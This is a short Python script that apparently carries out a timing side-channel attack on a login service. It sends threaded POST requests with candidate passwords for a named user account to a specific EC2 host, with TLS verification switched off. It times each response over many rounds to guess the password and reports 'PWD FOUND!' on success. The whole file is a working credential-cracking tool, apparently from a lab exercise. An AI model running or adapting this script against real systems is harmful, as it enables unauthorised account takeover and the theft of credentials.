# This is a sample Python script.

import concurrent.futures as confu
# Press ⇧F10 to execute it or replace it with your code.
# Press Double ⇧ to search everywhere for classes, files, tool windows, actions, and settings.
import datetime
import logging
import sys
import warnings
from typing import Tuple, List

import numpy as np
import requests

logger = logging.getLogger(__name__)
logging.basicConfig(level=logging.INFO,
                    format='[%(asctime)s] - %(levelname)s - %(module)s: %(message)s',
                    stream=sys.stdout)


def send(pwd: str) -> Tuple[int, int]:
    start = datetime.datetime.now()
    r = requests.post(
        'https://ec2-18-218-24-114.us-east-2.compute.amazonaws.com:8080',
        data={'username': 'au597939', 'password': pwd},
        verify=False
    )
    end = datetime.datetime.now()
    delta = (end - start)
    logger.debug(f'{r.status_code} - {r.text.strip()} | {pwd} - {delta.microseconds}')
    if r.status_code in {200, 201}:
        print(f'PWD FOUND! - {pwd}')
        exit(0)

    return r.status_code, delta.microseconds


def sample(pwd: str, rounds: int = 20) -> Tuple[str, int]:
    micros = np.asarray([send(pwd)[1] for _ in range(rounds)])
    logger.info(f'MED={np.median(micros)}, E={micros.mean()}, ST={micros.std()}')
    return pwd, micros.mean()


def verify_passwords(passwords: List[str], max_workers: int = 10):
    with confu.ThreadPoolExecutor(max_workers) as executor:
        futures = [executor.submit(sample, pwd) for pwd in passwords]
        for future in confu.as_completed(futures):
            try:
                pwd, mean = future.result()
                print(f'{mean} -- {pwd}')
            except ValueError as e:
                logger.exception(e)


# Press the green button in the gutter to run the script.
if __name__ == '__main__':
    warnings.filterwarnings("ignore")

    verify_passwords(['Password', 'none', 'Password1', 'Password '])
